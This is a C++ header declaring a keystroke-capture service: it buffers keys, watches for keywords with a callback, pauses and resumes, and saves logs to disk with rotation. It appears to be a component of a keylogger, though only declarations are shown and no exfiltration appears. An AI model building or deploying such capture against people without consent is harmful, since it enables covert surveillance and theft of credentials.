#pragma once

#include <atomic>
#include <functional>
#include <mutex>
#include <string>
#include <unordered_set>
#include <vector>

#include "domain/entities/KeystrokeEntry.hpp"
#include "domain/services/IKeystrokeService.hpp"

namespace nuub::domain::services {

class KeystrokeService final : public IKeystrokeService {
    std::vector<entities::KeystrokeEntry> buffer_;
    std::string current_word_;
    std::unordered_set<std::string> keywords_;
    std::function<void(const std::string&)> keyword_callback_;
    mutable std::mutex mutex_;
    std::atomic<bool> paused_{false};

    // Persistent log settings
    std::string log_path_;
    size_t max_buffer_size_ = 50000;  // Max keystrokes before rotation
    bool persistence_enabled_ = false;

    void check_keywords(const std::string& key);
    void flush_to_disk();
    void rotate_if_needed();

public:
    KeystrokeService() = default;
    explicit KeystrokeService(const std::string& log_path, size_t max_buffer = 50000);

    void process_press(const std::string& key) override;
    void process_release(const std::string& key) override;
    void pause() override;
    void resume() override;
    [[nodiscard]] bool is_paused() const override;
    [[nodiscard]] std::string get_log() override;
    std::string clear_log() override;

    void add_keyword(const std::string& keyword) override;
    void remove_keyword(const std::string& keyword) override;
    [[nodiscard]] std::vector<std::string> get_keywords() const override;
    void set_keyword_callback(std::function<void(const std::string&)> callback) override;

    // Persistence controls
    void enable_persistence(const std::string& log_path, size_t max_buffer = 50000);
    [[nodiscard]] size_t buffer_size() const;
};

} // namespace nuub::domain::services
